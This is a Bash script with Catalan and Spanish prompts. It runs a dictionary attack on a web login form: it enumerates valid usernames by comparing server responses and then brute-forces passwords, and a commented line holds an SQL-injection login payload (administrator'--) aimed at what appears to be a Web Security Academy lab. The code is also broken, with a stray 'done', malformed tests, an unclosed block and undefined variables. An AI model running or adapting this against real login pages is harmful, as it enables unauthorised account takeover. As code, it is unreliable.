#!/bin/bash
function ataque_diccionario() {
start=1
URL=$(echo -e "$url")
echo "Digam un usuari o un fitxer txt d'usuaris"
read document
if [ -f  $document ]
then
    echo "Recorda que aquest procés pot trigar minuts."
    total=$(wc -l < $document)
    while [ $start -le $total ]
        do
        test=$(awk "NR==$start{print $1}" $document)
    #    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "username is $test"
            username=$test
            break 1
        fi
        ((start = start + 1))
    #    echo $start
    done
else
    if [[! $(curl --verbose -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "username is $document"
            username=$test
            break 1
        else
            echo "username incorrecto"
        fi
        ((start = start + 1))
    #    echo $start
    done
fi

echo "Vols pasar un diccionari de contrasenyes o fem servir un diccionari ja existent?"
read document
if [ -f  $document ] 
then
    echo "Ficher valid"
else
    echo "El Fichero no es valid, usaremos un diccionario propio"
    document= b.txt
start=1
total=$(wc -l < $document)
while [ $start -le $total ]
    do
    test=$(awk "NR==$start{print $1}" $document)
    #    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        echo -e "La contrasenya és $test"
        password=$test
        break 1
    fi
    ((start = start + 1))
done
echo -e "Usuari es $usuari y usuari es $password"
}
